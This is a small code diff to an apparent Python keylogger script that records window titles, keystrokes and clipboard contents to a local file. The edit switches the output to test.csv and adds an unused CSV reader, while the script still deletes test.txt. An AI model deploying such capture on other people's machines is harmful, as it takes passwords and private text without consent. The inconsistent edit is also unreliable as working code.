@@ -8,7 +8,7 @@
 # Library imports here
 import window_info_logger as wilogger
 import keystrokes_and_clipboard_logger as kclogger
-import keyboard as kb
+import csv
 import os
 
 
@@ -17,7 +17,8 @@ def main():
     if os.path.isfile("test.txt"):
         os.remove("test.txt")
 
-    with open('test.txt', 'a+', encoding="utf-8") as f:
+    with open('test.csv', 'a+') as f:
+        csvreader = csv.reader(f)
         wilogger.initialise_log_file(f)
         kclogger.start_keylogger(f)
         last_window_title = None
